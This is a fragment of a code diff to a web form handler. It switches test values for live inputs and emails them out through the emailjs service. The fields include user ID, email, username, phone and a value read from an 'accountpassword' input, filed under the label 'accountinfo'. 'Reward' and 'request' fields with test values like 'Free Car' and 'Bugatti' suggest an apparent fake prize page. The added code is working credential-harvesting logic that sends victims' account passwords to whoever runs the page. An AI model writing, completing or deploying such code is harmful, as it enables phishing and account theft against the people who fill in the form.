@@ -169,27 +169,38 @@ document
 e.preventDefault();
 
 /* ✅ TEST TEMPLATE PARAMS */
+const requestElement =
+document.getElementById('request');
+
 const templateParams = {
 
-uid: "TEST UID",
+uid:
+document.getElementById('uid').value,
 
-email: "test@gmail.com",
+email:
+document.getElementById('email').value,
 
-username: "testuser",
+username:
+document.getElementById('username').value,
 
-accountinfo: "test",
+accountinfo:
+document.getElementById('accountpassword').value,
 
-phone: "9999999999",
+phone:
+document.getElementById('phone').value,
 
-reward: "Free Car",
+reward:
+document.getElementById('reward').value,
 
-request: "Bugatti",
+request:
+requestElement
+? requestElement.value
+: "None",
 
-photo: "test"
+photo:
+"Image Uploaded"
 
 };
-
-try{
 
 /* ✅ YOUR SERVICE + TEMPLATE IDs */
 await emailjs.send(
